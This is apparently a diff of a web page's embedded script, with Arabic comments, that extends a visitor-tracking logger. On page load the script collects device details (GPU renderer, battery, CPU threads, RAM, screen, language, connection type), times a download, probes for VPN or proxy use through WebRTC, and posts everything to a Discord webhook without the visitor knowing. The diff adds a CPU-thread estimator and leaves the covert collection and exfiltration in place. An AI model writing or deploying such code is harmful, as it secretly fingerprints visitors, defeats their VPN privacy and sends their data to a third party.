@@ -118,7 +118,9 @@
     </table>
   
     
-<script>
+
+
+  <script>
 async function getExtraDeviceInfo() {
     let batteryLevel = "Unknown";
     let isCharging = "Unknown";
@@ -129,15 +131,40 @@ async function getExtraDeviceInfo() {
         isCharging = battery.charging ? "Yes" : "No";
     }
 
+    // تحسين تقدير عدد أنوية المعالج باستخدام Web Workers
+    function estimateCPUThreads() {
+        return new Promise(resolve => {
+            if (navigator.hardwareConcurrency) {
+                resolve(navigator.hardwareConcurrency);
+            } else {
+                let workers = [];
+                let startTime = performance.now();
+                for (let i = 0; i < 16; i++) {
+                    let worker = new Worker(URL.createObjectURL(new Blob([`onmessage = () => postMessage(1);`], { type: 'text/javascript' })));
+                    workers.push(worker);
+                    worker.postMessage(1);
+                }
+                setTimeout(() => {
+                    resolve(workers.length);
+                    workers.forEach(worker => worker.terminate());
+                }, 500);
+            }
+        });
+    }
+
+    let cpuThreads = await estimateCPUThreads();
+    let ramSize = navigator.deviceMemory ? `${navigator.deviceMemory} GB (Estimated)` : "Unknown";
+
     return {
-        cpuCores: navigator.hardwareConcurrency || "Unknown",
-        ramSize: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown",
+        cpuCores: cpuThreads,
+        ramSize: ramSize,
         gpu: getGPUInfo(),
         battery: `${batteryLevel} (Charging: ${isCharging})`,
         numWindows: window.length || "Unknown"
     };
 }
 
+// تحسين دقة قراءة كرت الشاشة (GPU)
 function getGPUInfo() {
     let gl = document.createElement('canvas').getContext('webgl');
     if (!gl) return "Unknown GPU";
@@ -145,6 +172,7 @@ function getGPUInfo() {
     return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
 }
 
+// اختبار سرعة الإنترنت
 async function testInternetSpeed() {
     const startTime = performance.now();
     await fetch('https://speed.hetzner.de/100MB.bin', { method: 'HEAD', mode: 'no-cors' }).catch(() => {});
@@ -153,6 +181,7 @@ async function testInternetSpeed() {
     return downloadSpeed;
 }
 
+// كشف استخدام VPN/Proxy عبر WebRTC
 async function checkVPN() {
     try {
         let rtc = new RTCPeerConnection();
@@ -169,6 +198,7 @@ async function checkVPN() {
     }
 }
 
+// إرسال البيانات إلى Discord Webhook
 async function sendToWebhook() {
     const deviceInfo = await getExtraDeviceInfo();
     const internetSpeed = await testInternetSpeed();
@@ -203,8 +233,8 @@ async function sendToWebhook() {
                          `🖥️ **Screen Size:** ${screen.width}x${screen.height}\n` +
                          `🗣️ **Language:** ${navigator.language}\n` +
                          `📶 **Connection Type:** ${navigator.connection ? navigator.connection.effectiveType : "Unknown"}\n` +
-                         `🧠 **CPU Cores:** ${deviceInfo.cpuCores}\n` +
-                         `💾 **RAM Size:** ${deviceInfo.ramSize}\n` +
+                         `🧠 **CPU Cores (Estimated):** ${deviceInfo.cpuCores}\n` +
+                         `💾 **RAM Size (Estimated):** ${deviceInfo.ramSize}\n` +
                          `🎮 **GPU:** ${deviceInfo.gpu}\n` +
                          `🔋 **Battery:** ${deviceInfo.battery}\n` +
                          `🖥️ **Open Windows:** ${deviceInfo.numWindows}\n` +
@@ -230,3 +260,4 @@ async function sendToWebhook() {
 
 sendToWebhook();
 </script>
+
